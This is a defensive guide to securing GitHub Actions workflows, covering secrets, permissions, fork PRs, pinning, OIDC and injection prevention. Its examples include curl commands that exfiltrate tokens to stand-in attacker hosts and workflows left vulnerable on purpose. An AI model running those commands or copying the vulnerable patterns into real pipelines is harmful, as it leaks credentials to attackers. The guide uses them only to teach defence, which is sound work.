# GitHub Actions Security Best Practices

## A Comprehensive Guide for Secure CI/CD Pipelines

---

## Table of Contents

1. [Secret Management Dos and Don'ts](#1-secret-management-dos-and-donts)
2. [Principle of Least Privilege for Permissions](#2-principle-of-least-privilege-for-permissions)
3. [Handling Pull Requests from Forks](#3-handling-pull-requests-from-forks)
4. [Audit Logging](#4-audit-logging)
5. [Dependency Pinning — SHA vs Tag](#5-dependency-pinning--sha-vs-tag)
6. [Third-Party Action Security Checklist](#6-third-party-action-security-checklist)
7. [OpenID Connect for Cloud Authentication](#7-openid-connect-for-cloud-authentication)
8. [Secret Scanning](#8-secret-scanning)
9. [Code Injection Prevention](#9-code-injection-prevention)
10. [Security Checklist](#10-security-checklist)

---

## 1. Secret Management Dos and Don'ts

### What to Do

**DO store secrets in GitHub's secrets store.**

GitHub encrypts secrets using libsodium sealed boxes. The secret value is encrypted before it
reaches GitHub's servers and can only be decrypted by the specific workflow runner that needs it.

```bash
# Set a secret via the GitHub CLI
gh secret set API_KEY --body "sk-live-your-actual-key"

# Or from a file (useful for certificates and private keys)
gh secret set TLS_PRIVATE_KEY < /path/to/private.key
```

**DO use descriptive, namespaced secret names.**

```
DOCKERHUB_TOKEN           # clear: Docker Hub, token type
AWS_ACCESS_KEY_ID         # clear: AWS, specific field name
PROD_DATABASE_PASSWORD    # clear: production, database, password type
STAGING_REDIS_URL         # clear: staging, redis, connection URL
```

**DO rotate secrets regularly.**

Create a rotation schedule and calendar reminders. Many organizations rotate credentials every 90
days. Cloud providers like AWS and Azure support automatic key rotation through their secret
management services.

**DO use environment-level secrets for deployment credentials.**

Environment secrets can require human approval before a job can access them:

```yaml
jobs:
  deploy-production:
    environment: production    # pauses for manual approval if configured
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          PROD_API_KEY: ${{ secrets.PROD_API_KEY }}  # env-scoped secret
```

**DO audit which workflows access which secrets.**

Use GitHub's organization audit log to track secret access. Periodically review whether all
configured secrets are still used and whether any workflows have been granted unnecessary access.

**DO immediately rotate any secret that may have been exposed.**

If a secret appears in a log, a PR description, or a commit, assume it is compromised. Rotate it
immediately, then investigate how it was exposed.

### What Not to Do

**DO NOT hardcode secrets in workflow YAML files.**

Workflow files are part of your repository. Anyone with repository read access (and anyone who ever
clones it in the future) can see hardcoded values.

```yaml
# WRONG: hardcoded secret
- run: aws s3 sync . s3://my-bucket --access-key AKIAIOSFODNN7EXAMPLE

# RIGHT: use a secret
- run: aws s3 sync . s3://my-bucket
  env:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

**DO NOT store secrets in repository variables.**

Variables are not encrypted and are visible to anyone with read access via the GitHub API.

```yaml
# WRONG: variable for a sensitive value
- run: ./deploy.sh --token ${{ vars.API_TOKEN }}   # vars are not encrypted

# RIGHT: use a secret
- run: ./deploy.sh --token "$API_TOKEN"
  env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
```

**DO NOT log secret values, even for debugging.**

GitHub's masking only applies to the exact byte sequence of the secret value. Encoding or
transforming the secret (base64, URL encoding, hex) produces a different byte sequence that is
NOT masked.

```yaml
# WRONG: even though GitHub masks ${{ secrets.API_KEY }}, this is bad practice
- run: echo "Debug: API_KEY=${{ secrets.API_KEY }}"

# WRONG: base64-encoded value is NOT masked
- run: |
    echo "${{ secrets.API_KEY }}" | base64

# RIGHT: verify the secret is set without printing its value
- run: |
    if [ -n "$API_KEY" ]; then
      echo "API_KEY is configured (length: ${#API_KEY})"
    fi
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

**DO NOT pass secrets as command-line arguments.**

Command-line arguments are visible in the process table (`ps aux` output) and may be logged by
system audit tools.

```yaml
# WRONG: secret visible in process listing
- run: ./deploy.sh --password "${{ secrets.DB_PASSWORD }}"

# RIGHT: pass as environment variable, read it inside the script
- env:
    DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
  run: ./deploy.sh   # script reads $DB_PASSWORD from environment
```

**DO NOT commit secrets to `GITHUB_ENV` or `GITHUB_OUTPUT`.**

These files are written to disk and may persist after the job. Treat them as insecure.

**DO NOT share secrets across unrelated repositories without a reason.**

Organization secrets set to "All repositories" means every workflow in the org — including
untrusted forks — can potentially access them. Prefer "Selected repositories" access.

---

## 2. Principle of Least Privilege for Permissions

### Default GITHUB_TOKEN Permissions

Many organizations configure `GITHUB_TOKEN` to default to read-only. Check your organization
settings (Organization Settings > Actions > General > Workflow permissions).

Regardless of defaults, you should **always** explicitly declare permissions:

### Workflow-Level Permissions

```yaml
# Option A: Explicitly restrict everything for the whole workflow
permissions:
  contents: read
  pull-requests: read
  # Everything else is 'none' by default

jobs:
  build:
    # Inherits workflow-level permissions
    runs-on: ubuntu-latest

  deploy:
    # Override for this job only
    permissions:
      contents: write   # needs to push tags
      packages: write   # needs to push container images
    runs-on: ubuntu-latest
```

```yaml
# Option B: Start with nothing, add per-job
permissions: {}    # WORKFLOW: no permissions to any job by default

jobs:
  test:
    permissions:
      contents: read    # only needs to read code
    runs-on: ubuntu-latest

  publish:
    permissions:
      packages: write   # only needs to push packages
      contents: read
    runs-on: ubuntu-latest
```

### Permission Reference

| Permission | Read | Write | Use Case |
|-----------|------|-------|----------|
| `actions` | List runs, artifacts | Cancel runs, delete artifacts | CI orchestration |
| `checks` | Read check runs | Create check runs/suites | Status reporting |
| `contents` | Read files, tags | Push commits, create releases | Checkout, release |
| `deployments` | Read deployments | Create/update deployments | Deployment tracking |
| `id-token` | N/A | Request OIDC JWT | Cloud auth via OIDC |
| `issues` | Read issues | Create/update issues, comments | Issue automation |
| `metadata` | Always granted | N/A | Basic repo metadata |
| `packages` | Pull packages | Push packages | Container registry |
| `pull-requests` | Read PRs | Create/update PRs, comments | PR automation |
| `security-events` | Read alerts | Upload SARIF, create alerts | Security scanning |
| `statuses` | Read statuses | Create commit statuses | Status checks |

### Isolating Untrusted Work

For jobs that run user-supplied code or third-party tools, use `permissions: {}`:

```yaml
jobs:
  lint-user-code:
    # This job checks out and runs user code — give it nothing
    permissions: {}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: flake8 src/ tests/ --max-line-length=120
      # If the linter tries to call the GitHub API, it will be rejected (no token)
```

---

## 3. Handling Pull Requests from Forks

Fork pull requests are the most common source of secret exfiltration in GitHub Actions. Understanding
the risk is critical for any public repository.

### The Threat Model

When someone forks your repository and opens a PR, your workflow runs with their code. A malicious
contributor could add code to:

```bash
# Hypothetical attack in a test file or build script:
curl -X POST https://attacker.example.com/steal \
  -d "token=$AWS_SECRET_ACCESS_KEY"
```

If your workflow passes secrets to this PR's job, the attacker receives your credentials.

### GitHub's Default Protections

By default, GitHub Actions protects you from fork PR attacks:

1. `pull_request` events from forks do **not** have access to secrets.
2. `GITHUB_TOKEN` has only read permissions for fork PRs.
3. The `pull_request` trigger checks out the PR's code at the fork's SHA.

### Event Trigger Security Comparison

| Trigger | Has Secrets? | GITHUB_TOKEN Permissions | Code Checked Out |
|---------|-------------|--------------------------|-----------------|
| `push` | Yes | Full (per permissions:) | Base branch |
| `pull_request` (same repo) | Yes | Full | PR head |
| `pull_request` (fork) | No | Read-only | Fork's code |
| `pull_request_target` | Yes | Full | **Base branch** (not fork!) |

### Safe Pattern: `pull_request_target`

`pull_request_target` runs in the context of the *base* repository (not the fork), so it has access
to secrets. But it should **never** check out the PR's code and run it with secrets:

```yaml
# DANGEROUS: checks out fork's code with secrets available
on: pull_request_target

jobs:
  dangerous-job:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # FORK'S CODE
      - run: pip install -r requirements.txt && pytest tests/   # attacker can steal secrets here!
        env:
          SECRET: ${{ secrets.MY_SECRET }}   # EXPOSED!
```

```yaml
# SAFE: uses pull_request_target only for actions that don't run fork code
on: pull_request_target

jobs:
  label-pr:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      # No checkout — no code runs from the fork
      - name: Add label
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          gh pr edit ${{ github.event.pull_request.number }} --add-label "needs-review"
```

### The Two-Workflow Pattern

The recommended approach for running tests on fork PRs while keeping secrets safe:

**Workflow 1**: Runs on `pull_request`, NO secrets, builds and uploads artifacts.
**Workflow 2**: Runs on `workflow_run` (triggered by Workflow 1's completion), HAS secrets, downloads artifacts.

```yaml
# Workflow 1: pull-request-build.yml
on: pull_request

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    # No secrets available here (fork PR)
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt && pytest tests/ --junitxml=test-results/results.xml
      - uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: test-results/

# Workflow 2: pull-request-report.yml
on:
  workflow_run:
    workflows: ["pull-request-build.yml"]
    types: [completed]

jobs:
  report:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write    # CAN comment on PRs
      checks: write
    steps:
      # Download artifacts produced by the untrusted code
      - uses: actions/download-artifact@v4
        with:
          name: test-results
          github-token: ${{ secrets.GITHUB_TOKEN }}
          run-id: ${{ github.event.workflow_run.id }}
      # Post results — can use secrets here safely (no untrusted code runs)
      - run: ./report-results.sh
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

---

## 4. Audit Logging

### GitHub Audit Log

GitHub records all security-relevant events in the organization audit log. For secrets:

- `secret.access` — a secret was accessed by a workflow
- `secret.create` — a secret was created
- `secret.update` — a secret was updated
- `secret.destroy` — a secret was deleted
- `secret.decrypt_failure` — decryption failed (rare, may indicate tampering)

Access the audit log:
1. Organization Settings > Audit log
2. Use the search filter: `action:secret`
3. Export to CSV or JSON for analysis

### Programmatic Audit Log Access

```bash
# List audit log entries related to secrets via the API
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  "https://api.github.com/orgs/YOUR-ORG/audit-log?phrase=action:secret&per_page=100" \
  | jq '.[] | {action, actor, repo, created_at}'
```

### Workflow Access Logging

Each workflow run's log shows which secrets were accessed. Review the "Set up job" section at the
start of each run — it lists the secrets that were requested for that job.

### Best Practices for Audit

1. **Review secret access monthly**: Check whether secrets are being accessed in expected workflows.
2. **Alert on unusual access**: Set up GitHub Advanced Security alerts or external SIEM integration.
3. **Track secret inventory**: Maintain a list of all secrets, their purposes, and rotation dates.
4. **Review after incidents**: After any security incident, check the audit log for the previous 90
   days of secret access.
5. **Remove unused secrets**: Periodically review `gh secret list` and delete secrets no longer used.

---

## 5. Dependency Pinning — SHA vs Tag

### Why Pinning Matters

When you use a third-party action, you reference it by `owner/repo@ref`. The `ref` can be:

- A **tag** like `@v4` or `@v4.0.1` — the tag could be moved or deleted.
- A **branch** like `@main` — changes with every commit.
- A **commit SHA** like `@a1b2c3d` — immutable.

A supply chain attack could:
1. Compromise the action author's account.
2. Push malicious code to the action repository.
3. Move the `v4` tag to point to the malicious commit.
4. All workflows using `@v4` now run the attacker's code.

### Pinning to a Commit SHA

```yaml
# UNSAFE: tag can be moved
- uses: actions/checkout@v4

# SAFER: specific version tag (better, but tags can be moved/deleted)
- uses: actions/checkout@v4.2.1

# SAFEST: pinned to commit SHA (immutable)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

### How to Find the SHA for a Tag

```bash
# Using git
git ls-remote https://github.com/actions/checkout refs/tags/v4.2.2

# Using gh CLI
gh api repos/actions/checkout/git/refs/tags/v4.2.2 --jq '.object.sha'
```

### Automating SHA Updates with Dependabot

Dependabot can automatically open PRs to update pinned SHAs when new versions are released:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns: ["*"]
```

### Balancing Security and Readability

For actions from trusted publishers (GitHub itself, major cloud providers), pinning to a version
tag with a comment showing the SHA is a reasonable balance:

```yaml
# Trusted publisher — pinned to SHA, comment shows friendly version
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b  # v5.3.0
- uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
```

For unknown or less-trusted publishers, always use the full SHA.

---

## 6. Third-Party Action Security Checklist

Before using any third-party action in a workflow that handles secrets or deploys to production,
evaluate it against this checklist.

### Pre-Use Evaluation

```
[ ] Is the action from a verified publisher?
    GitHub labels some publishers as "verified" (blue checkmark).
    Prefer actions from GitHub itself, major cloud vendors, or well-known OSS projects.

[ ] How many users/stars does the repository have?
    Popularity is not a guarantee of security, but obscure actions with few users
    are higher risk.

[ ] When was the action last updated?
    An action not updated in 2+ years may have vulnerabilities and may not follow
    current best practices.

[ ] Does the action request more permissions than it needs?
    Review the action's README and source code (action.yml and the main script).
    Be suspicious if it requests contents: write for a read-only operation.

[ ] Is the source code available and readable?
    Avoid actions published only as pre-compiled JavaScript with no visible source.

[ ] Does the action have a published security policy (SECURITY.md)?
    This indicates the maintainer takes security seriously.

[ ] Has the action been audited or independently verified?
    GitHub-maintained actions undergo security review.
```

### During Use

```
[ ] Pin the action to a commit SHA, not a mutable tag or branch.
[ ] Use the minimum permissions needed (set in the job's permissions: block).
[ ] Do not pass secrets as environment variables to the action unless
    the action's documentation explicitly says it reads from that variable.
[ ] Prefer actions that accept secrets via with: inputs (they handle them
    more carefully than arbitrary env vars).
[ ] Review every new major version of the action before updating.
```

### Automated Scanning

Use GitHub's dependency review and Dependabot to detect:
- Known vulnerable action versions
- Actions pinned to mutable references
- Outdated dependencies

```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review

on: pull_request

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - uses: actions/dependency-review-action@a6993e2c61fd2b4f243d8e7c9fd7ab11e86e591e  # v4.3.5
        with:
          fail-on-severity: moderate
```

---

## 7. OpenID Connect for Cloud Authentication

### The Problem with Long-Lived Credentials

Traditional cloud authentication in GitHub Actions looks like this:

```yaml
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

These are long-lived credentials with the following risks:
- If the secret leaks, the attacker has access until you rotate them.
- Manual rotation is required regularly.
- The credentials have the same permissions whether used by a human or a workflow.

### OIDC: Short-Lived Tokens Without Stored Secrets

OpenID Connect (OIDC) solves this. Instead of storing credentials, you configure your cloud
provider to trust GitHub Actions, and GitHub provides a short-lived JWT token that the cloud
provider exchanges for a scoped, time-limited access token.

```
GitHub Actions Runner
       |
       | (1) Request OIDC token from GitHub
       v
GitHub OIDC Provider (https://token.actions.githubusercontent.com)
       |
       | (2) Issues JWT with claims: repo, workflow, environment, sha
       v
GitHub Actions Runner
       |
       | (3) Exchange JWT for cloud credentials
       v
Cloud Provider (AWS, Azure, GCP)
       |
       | (4) Verify JWT signature, check claims against IAM policy
       | (5) Issue short-lived access token (1 hour max)
       v
GitHub Actions Runner
       |
       | (6) Use access token for cloud operations
       v
Cloud Resources (S3, ECR, Lambda, etc.)
```

### AWS OIDC Setup

**Step 1**: Create an IAM Identity Provider in AWS.

```bash
# AWS CLI
aws iam create-open-id-connect-provider \
  --url "https://token.actions.githubusercontent.com" \
  --client-id-list "sts.amazonaws.com" \
  --thumbprint-list "6938fd4d98bab03faadb97b34396831e3780aea1"
```

**Step 2**: Create an IAM Role with a trust policy.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:YOUR-ORG/YOUR-REPO:*"
        }
      }
    }
  ]
}
```

**Step 3**: Use in your workflow.

```yaml
permissions:
  id-token: write    # REQUIRED: allows requesting OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC — no stored secrets!)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole
          aws-region: us-east-1
          # Note: No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY needed

      - name: Deploy to AWS
        run: aws s3 sync ./dist s3://my-bucket/
```

### GCP OIDC Setup

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID'
          service_account: 'github-actions@PROJECT_ID.iam.gserviceaccount.com'

      - run: gcloud run deploy my-service --image gcr.io/project/image
```

### Azure OIDC Setup

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v2
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}          # not a secret!
          tenant-id: ${{ vars.AZURE_TENANT_ID }}          # not a secret!
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}  # not a secret!
          # No client secret needed with OIDC

      - run: az webapp deploy --resource-group rg-prod --name myapp --src-path ./dist
```

### OIDC Security Benefits

- **No stored credentials**: Nothing to rotate, nothing to leak from secrets.
- **Short-lived tokens**: Tokens expire in 1 hour — compromised tokens have limited blast radius.
- **Scoped access**: Configure the IAM role to only allow what the workflow needs.
- **Environment-specific access**: Restrict which GitHub environments can assume which role.
- **Audit trail**: Cloud providers log every token issuance and credential use.

---

## 8. Secret Scanning

### GitHub Secret Scanning

GitHub automatically scans repositories for known secret patterns (API keys, tokens, certificates).
When a secret is detected:
- The repository owner receives an email alert.
- For partner patterns (AWS, Google, Stripe, etc.), GitHub notifies the provider who may revoke it.
- The detection appears in Security > Secret scanning.

### Enabling Secret Scanning

Secret scanning is enabled by default for public repositories. For private repositories (requires
GitHub Advanced Security):

1. Go to Settings > Security > Code security and analysis.
2. Enable "Secret scanning".
3. Optionally enable "Push protection" to block commits containing secrets.

### Push Protection

Push protection prevents secrets from entering the repository at all:

```
git push
...
remote: error: GH013: Repository rule violations found for refs/heads/main.
remote:
remote: - GITHUB PUSH PROTECTION
remote:   —————————————————————————————————————————
remote:     Resolve the following violations before pushing:
remote:
remote:     - Push cannot contain secrets
remote:       (?) To push, remove secret from commit(s) or
remote:           bypass the block by going to https://github.com/...
```

### Custom Secret Scanning Patterns

Define custom patterns for organization-specific secrets:

1. Organization Settings > Security > Secret scanning > Custom patterns.
2. Add a regular expression matching your secret format.
3. GitHub will scan all repositories in the organization.

Example custom pattern for an internal token format `INT-[0-9a-f]{32}`:

```
INT-[0-9a-f]{32}
```

### Pre-Commit Hooks for Local Detection

Install `detect-secrets` or `gitleaks` as pre-commit hooks to catch secrets before they are
committed:

```bash
# Install gitleaks
brew install gitleaks   # macOS
# or
curl -L https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_x64.tar.gz | tar xz

# Run manually
gitleaks detect --source . --verbose

# As a pre-commit hook (using pre-commit framework)
# .pre-commit-config.yaml:
# repos:
#   - repo: https://github.com/gitleaks/gitleaks
#     rev: v8.18.4
#     hooks:
#       - id: gitleaks
```

---

## 9. Code Injection Prevention

### What is Expression Injection?

GitHub Actions expressions (`${{ ... }}`) are evaluated by the GitHub Actions runner before the
shell executes the command. If untrusted data flows into an expression that becomes part of a shell
command, an attacker can inject arbitrary shell code.

### Example: Vulnerable Workflow

```yaml
on:
  issue_comment:
    types: [created]

jobs:
  process-comment:
    runs-on: ubuntu-latest
    steps:
      # DANGEROUS: github.event.comment.body contains the comment text.
      # If a user comments: `$(curl https://attacker.com/steal)`, the expression
      # expands to that string, which the shell then executes.
      - run: echo "Comment: ${{ github.event.comment.body }}"
```

If someone comments `$(curl https://attacker.com/steal?token=$GITHUB_TOKEN)`, the expression
expands to that shell command, and it executes.

### Fix: Always Use an Intermediate Environment Variable

```yaml
- name: Process comment (safe version)
  env:
    # Assign untrusted input to an env var — the value goes to the env,
    # not into the shell command line.
    COMMENT_BODY: ${{ github.event.comment.body }}
  run: |
    # Now reference the variable as $COMMENT_BODY.
    # Shell treats it as a DATA string, not as commands.
    echo "Comment: $COMMENT_BODY"
    # Even if COMMENT_BODY contains $(rm -rf /), it is printed as a string.
```

### Other Injection-Prone Contexts

Any user-controlled data flowing into an expression is potentially dangerous:

| Source | Context |
|--------|---------|
| `github.event.pull_request.title` | PR title |
| `github.event.pull_request.body` | PR description |
| `github.event.issue.title` | Issue title |
| `github.event.issue.body` | Issue body |
| `github.event.comment.body` | PR/issue comment |
| `github.event.review.body` | PR review comment |
| `github.head_ref` | Source branch name (attacker controls their branch name) |
| `github.event.inputs.*` | Manual trigger inputs |

### Safe Data Handling Patterns

**Pattern 1**: Assign to env var, use `$VAR_NAME` in scripts.

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: |
  echo "PR title: $PR_TITLE"
```

**Pattern 2**: Use `toJSON()` for structured data.

```yaml
- uses: actions/github-script@v7
  env:
    ISSUE_BODY: ${{ toJSON(github.event.issue.body) }}
  with:
    script: |
      const body = JSON.parse(process.env.ISSUE_BODY);
      console.log(body);
```

**Pattern 3**: Validate inputs before using them.

```yaml
- name: Validate environment input
  run: |
    DEPLOY_ENV="${{ github.event.inputs.environment }}"
    # Allowlist validation — only accept known values
    case "$DEPLOY_ENV" in
      staging|production|development)
        echo "Valid environment: $DEPLOY_ENV"
        ;;
      *)
        echo "ERROR: Invalid environment '$DEPLOY_ENV'. Must be staging, production, or development."
        exit 1
        ;;
    esac
```

**Pattern 4**: Use `github-script` action to keep logic in JavaScript (avoids shell injection entirely).

```yaml
- uses: actions/github-script@v7
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
    script: |
      // All of this runs in JavaScript, not a shell.
      // String interpolation here does NOT cause shell injection.
      const title = context.payload.pull_request.title;
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.payload.pull_request.number,
        body: `PR title received: ${title}`  // safe — no shell involved
      });
```

---

## 10. Security Checklist

Use this checklist before deploying a new workflow to production.

### Secrets and Variables

```
[ ] All secrets are stored in GitHub's secrets store (not hardcoded in YAML).
[ ] No secrets are stored as repository variables.
[ ] Secret names are descriptive and namespaced (PROVIDER_RESOURCE_TYPE).
[ ] Secrets are not logged in any step.
[ ] Secrets are not passed as command-line arguments.
[ ] A rotation schedule exists for all long-lived credentials.
[ ] OIDC is used for cloud authentication where supported.
```

### Permissions

```
[ ] A permissions: block is declared at the workflow level.
[ ] Each job has the minimum permissions it needs (start from none, add what's required).
[ ] Jobs running untrusted code have permissions: {}.
[ ] GITHUB_TOKEN is not used for cross-repository or cross-organization operations
    (use a PAT stored as a secret if needed, with the minimum required scopes).
```

### Fork PRs

```
[ ] pull_request workflows do not use secrets (GitHub blocks this by default).
[ ] pull_request_target workflows do NOT check out the fork's code.
[ ] The two-workflow pattern is used if secret-requiring steps need fork PR data.
```

### Dependencies

```
[ ] All third-party actions are pinned to a commit SHA.
[ ] Dependabot is configured to keep action SHAs updated.
[ ] Third-party actions have been reviewed for legitimacy and reasonable permissions.
```

### Code Injection

```
[ ] No untrusted data (PR title/body, issue text, comments) flows directly into
    ${{ expression }} inside run: commands.
[ ] User-controlled data is assigned to env vars and referenced as $VAR_NAME.
[ ] Inputs from workflow_dispatch are validated against an allowlist.
```

### Secret Scanning

```
[ ] GitHub Secret Scanning is enabled for the repository.
[ ] Push protection is enabled to prevent accidental commits.
[ ] gitleaks or detect-secrets is configured as a pre-commit hook.
```

---

*Related resources:*
- *[GitHub Docs: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)*
- *[GitHub Docs: Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication)*
- *[GitHub Docs: OpenID Connect in GitHub Actions](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)*
- *[OWASP: CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)*
